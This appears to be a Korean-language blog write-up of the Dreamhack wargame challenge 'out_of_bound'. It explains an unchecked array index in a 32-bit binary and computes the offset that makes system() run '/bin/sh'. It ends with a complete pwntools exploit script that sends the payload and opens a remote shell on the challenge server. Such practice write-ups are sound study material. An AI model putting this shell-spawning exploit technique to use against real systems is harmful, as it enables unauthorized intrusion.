---
title: out_of_bound
description: Dremhack [Wargame] - out_of_bound
author: juhyeongkim
date: 2024-10-31 08:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Pwnable]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
#   path: 
#   lqip: 
#   alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/11)

## 바이너리 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

<br>

## 1. OOB

```c
scanf("%d", &idx);

system(command[idx]);

```

이 부분을 보면, `idx`에 값을 입력받고, `command[idx]`를 통해 인덱스에 접근하는데, 유효한 인덱스인지 확인하지 않기 때문에 OOB 취약점이 존재함을 알 수 있다. 

여기서 `system(command[idx])`를 수행할 때 OOB를 통해 `command[idx]`에 **`"/bin/sh"` 문자열이 저장된 주소**가 저장되어 있다면 `system("/bin/sh");`를 수행하게 되어 쉘을 획득할 수 있게 될 것이다.

**처음엔 `command[idx]`에 바로 `"/bin/sh"` 자체를 저장하면 되는게 아닌가 했는데, 그게 아니라 `command[idx]`에는 `"/bin/sh"` 문자열을 가리키는 주소를 저장해야 한다.**

<br>

## 2. **"/bin/sh"** 입력

전역 변수로, 아래와 같이 `name`, `command` 배열이 선언되어 있기 때문에 `name`에 `"/bin/sh"` 을 가리키는 주소를 입력하고 같은 세그먼트에 존재하기 때문에 오프셋으로 접근하면 될 것이라는 것을 알 수 있다.

```c
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
```

그리고, `main()`을 보면 `read(0, name, sizeof(name));`을 통해 `name`에 원하는 값을 입력할 수 있는 것도 알 수 있다.

그런데 여기서 `name`에는 `/bin/sh"` 문자열을 저장하는 주소를 입력해줘야 하는데, `"/bin/sh"` 은 바이너리에 사용된 `libc`에만 존재하므로 `libc`의 베이스 주소를 모르는 경우에는 사용할 수 없다.

<img width="341" alt="image" src="https://github.com/user-attachments/assets/d227d3c4-7bcc-4dd1-979d-05720a9ca316">

잘 생각해보면 `name`은 `char name[16]` 으로 선언되어 있기 때문에, `name[0]`에 `"/bin/sh"`을 저장해주고, `name[8]`에 `name[0]`의 주소를 입력해주면 결국 `command[idx]`가 `"/bin/sh"` 문자열이 저장된 주소를 가리키게 할 수 있다.

따라서, `command[idx]`에는 `name[8]`의 주소가 저장되야 함을 알 수 있다. 결국 `read(0, name, sizeof(name));`을 통해 `name`에 `"/bin/sh" + name[0]의 주소`를 입력해주면 된다.

헷갈린 점은 `system("/bin/sh");` 자체도 문자열이 전달되는게 아닌가 했는데, 해당 코드가 존재하는 바이너리를 보면 `rdi`에 `"/bin/sh"` 문자열 자체가 아닌 해당 문자열 리터럴을 가리키는 주소가 전달된다.

`command[idx]`로 배열의 인덱스를 통해 전달하면 해당 배열의 주소가 아닌 해당 배열에 저장된 값이 전달되므로, `command[idx]`에는 `"/bin/sh"`이 저장된 주소를 전달해야 한다.

**인덱스로 전달하면 원소인 문자열 리터럴 자체가 전달되고, 만약 command로 전달하면 배열의 주소가 전달되는 차이점을 기억하자**

<br>

## 3. **name**, **command** 오프셋 계산

<img width="481" alt="image" src="https://github.com/user-attachments/assets/5c39dd9b-014c-4405-b771-14a022b8af1c">

`command`를 기준으로 `name`이 `76` 만큼 떨어져 있는 것을 알 수 있다. 처음에는 `char *`의 크기가 `8bytes`이므로 `76`만큼 떨어져있으면 오프셋으로 딱 나누어지지 않아서 안되는가라는 생각을 했는데 `checksec`으로 확인해보면 해당 바이너리가 `32-bit`이다.\
(참고로, 이번 문제에서 `idx`의 주소는 필요 없긴 하지만 `gcc -g` 옵션을 주지 않으면 바이너리를 gdb로 디버깅 할 때, `print`가 안먹히긴 한다.)

<img width="639" alt="image" src="https://github.com/user-attachments/assets/0133d28a-0e64-4bca-931f-efb04146775f">

따라서, `char *`의 크기가 `4bytes` 이기 때문에 `scanf("%d", &idx);`를 통해 `name[8]`을 가리키는 `(76 + 8) / 4 = 21`, `idx`에 `21`를 입력해주면 쉘을 획득할 수 있음을 알 수 있다.

<br>

## Exploit 

주의할 점은 `name`에 `"/bin/sh"`을 입력해줄 때, 오프셋으로 접근하기 위해 8바이트 단위로 끊어야 하기 때문에 `b"/bin/sh"` 7바이트에 `b"\x00"` 1바이트를 추가해줘야 된다.

그리고, `name[0]`의 주소는 해당 바이너리에 `PIE`가 적용되어 있지 않기 때문에 데이터 영역도 랜덤화되지 않아서, 고정 가상 주소를 통해 접근할 수 있기 때문에 위에서 본 `name`의 주소인 `0x804a0ac`를 대입해주면 된다.

```py
from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 14448)

payload = b"/bin/sh" + b"\x00"  # 8바이트를 맞춰주기 위해 b'\x00'을 추가해줘야함
payload += p32(0x804A0AC) # name의 주소 (system의 인자에는 "/bin/sh" 문자열 자체가 아닌 해당 문자열의 주소가 들어가야함)
p.send(payload)

# &name - &command = 76 이므로, 32-bit에서 char *의 크기인 4byte만큼 index 19차이가 나고, name의 주소는 8byte 뒤에 입력되어 있어서 4byte만큼 2번 더 가야함
idx = 19 + 2
p.sendline(str(idx).encode())  # scanf("%d")에 입력하기 때문
# p.sendline(b'21')             # 그냥 이렇게 써도 됨

p.interactive()
```
